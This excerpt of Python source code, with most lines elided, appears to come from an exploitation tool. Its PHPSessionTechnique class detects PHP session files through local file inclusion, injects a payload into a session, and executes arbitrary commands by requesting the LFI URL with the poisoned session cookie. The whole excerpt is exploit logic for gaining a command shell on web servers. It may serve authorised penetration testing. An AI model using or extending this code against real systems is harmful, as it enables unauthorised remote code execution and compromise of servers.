...
class PHPSessionTechnique(TechniqueBase):
        ...
        try:
            ...
            for path_template in self.session_paths:
                ...
                if self.detection_string in result:
                    logger.info(
                        f"Target is vulnerable to PHP session technique! Session file found at {path}"
                    )
    ...
    def exploit(self) -> bool:
        ...
        try:
            ...
            if self.session_path and self.session_cookie:
                ...
                success = self._update_session_with_payload(
                    self.session_cookie, self.session_payload
                )
    ...
    def execute(self, command: str) -> str:
        ...
        if not self.shell_path or not self.session_cookie:
            raise ExecutionError(
                "No PHP session shell established. Run exploit() first."
            )
    ...
    def _create_session_with_payload(self, payload: str) -> Optional[str]:
        ...
        try:
            ...
            if not session_id:
                ...
                session_id = "".join(
                    random.choice(string.hexdigits.lower()) for _ in range(32)
                )
    ...
    def _execute_via_session(self, command: str) -> str:
        ...
        try:
            ...
            response = self.session.get(lfi_url, cookies=cookies, timeout=self.timeout)
